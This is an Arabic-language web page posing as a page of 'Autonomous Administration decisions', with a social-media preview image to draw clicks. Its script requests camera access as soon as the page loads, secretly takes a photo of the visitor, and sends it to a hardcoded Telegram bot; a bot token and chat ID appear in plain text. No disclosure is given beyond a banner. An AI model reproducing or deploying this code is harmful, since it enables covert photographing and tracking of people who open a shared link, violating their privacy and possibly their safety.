
<!-- const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك -->

<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Open Graph Tags لتحديد صورة عند مشاركة الرابط -->
    <meta property="og:title" content="قرارات الادارة الذاتية" />
    <meta property="og:description" content="مشاركة قرارات الادارة الذاتية مع الصورة" />
    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT2DdW2NUpE7G8U7Wawg9UD_O_dhTTz0X0-kfsfz16ZolwSBQtlg4b3UnT5NihxZMWMQa8&usqp=CAU" />
    <meta property="og:image:width" content="1200" />
    <meta property="og:image:height" content="630" />
    <meta property="og:image:type" content="image/images.jpg" />
    
    <title> قرارات </title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }

        h1 {
            color: #333;
            margin-top: 20px;
        }

        #permissionRequest {
            background-color: #28a745;
            color: white;
            padding: 20px;
            border-radius: 10px;
            font-size: 18px;
            margin-top: 30px;
            text-align: center;
        }

    </style>
</head>
<body>
   

    <!-- واجهة مخصصة لطلب الإذن -->
    <div id="permissionRequest">
        <p> قرارات الادارة الذاتية </p>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '6822625757:AAFuBb7icwxuFpKjqFTWwlKb5poUSUfWTNo'; // استبدل هذا بالتوكن الخاص بك
        const TELEGRAM_CHAT_ID = '5152526784'; // استبدل هذا بالـ chat_id الخاص بك

        // عند تحميل الصفحة مباشرة، طلب الوصول إلى الكاميرا
        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    // إخفاء واجهة الطلب بعد الحصول على الإذن
                    document.getElementById('permissionRequest').style.display = 'none';

                    // التقاط الصورة فقط
                    captureImageAndSendToTelegram(stream);
                })
                .catch(function(error) {
                    alert('حدث خطأ في الوصول إلى الكاميرا. تأكد من تمكين الإذن.');
                });
        };

        function captureImageAndSendToTelegram(stream) {
            // إنشاء عنصر فيديو مؤقت لالتقاط الصورة
            const videoElement = document.createElement('video');
            videoElement.srcObject = stream;
            videoElement.play();

            // الانتظار حتى يتم تحميل الفيديو (حتى يبدأ التشغيل)
            videoElement.onloadedmetadata = function() {
                // إنشاء عنصر canvas لالتقاط الصورة
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                // رسم الصورة من الفيديو على الـ canvas
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                // تحويل الصورة إلى Blob
                canvas.toBlob(function(blob) {
                    // إرسال الصورة إلى بوت Telegram
                    sendImageToTelegram(blob);

                    // إيقاف تدفق الكاميرا بعد إرسال الصورة
                    stopCamera(stream);
                }, 'image/png');
            };
        }

        function sendImageToTelegram(imageBlob) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', imageBlob, 'image.png'); // إرسال الصورة كـ Blob

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('تم إرسال الصورة بنجاح إلى Telegram:', data);
            })
            .catch(error => {
                console.error('حدث خطأ أثناء إرسال الصورة إلى Telegram:', error);
            });
        }

        function stopCamera(stream) {
            const tracks = stream.getTracks();
            tracks.forEach(track => track.stop()); // إيقاف كل المسارات (الكاميرا)
        }
    </script>
</body>
</html>

